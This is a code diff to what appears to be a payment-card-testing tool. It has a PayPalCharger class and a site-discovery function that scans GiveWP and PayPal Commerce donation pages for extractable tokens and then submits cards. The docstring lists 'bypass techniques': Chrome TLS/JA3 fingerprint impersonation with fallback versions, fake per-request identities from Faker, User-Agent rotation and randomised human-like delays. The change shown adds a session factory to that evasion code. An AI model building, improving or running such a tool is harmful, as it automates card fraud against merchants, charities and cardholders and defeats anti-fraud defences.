@@ -11,7 +11,7 @@ Two supported site types:
      and the order token, then submit the card.
 
 Bypass techniques applied:
-  - curl_cffi `impersonate="chrome131"` for Chrome TLS fingerprint + JA3
+  - curl_cffi chrome fingerprint (131 → 124 → 120 fallback chain) for TLS + JA3
   - Per-request Faker identity (name, email, phone, address)
   - Random User-Agent rotation (Chrome 131 desktop variants)
   - Random human-like delays between requests (300-1200ms)
@@ -271,7 +271,7 @@ class PayPalCharger:
         self.amount = _format_amount(amount)
         self.currency = currency.upper()
         self.proxy = _parse_proxy(proxy)
-        self.session = cffi.Session(impersonate="chrome131")
+        self.session = _make_session()
         if self.proxy:
             self.session.proxies = {"http": self.proxy, "https": self.proxy}
 
@@ -734,7 +734,7 @@ def discover_sites(extra_urls: Optional[List[str]] = None, timeout: int = 12) ->
                 "has_givewp_form": False, "has_paypal_commerce": False,
                 "tokens_extractable": False, "error": None}
         try:
-            sess = cffi.Session(impersonate="chrome131")
+            sess = _make_session()
             sess.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"})
             r = sess.get(s["url"], timeout=timeout, allow_redirects=True)
             info["status"] = r.status_code
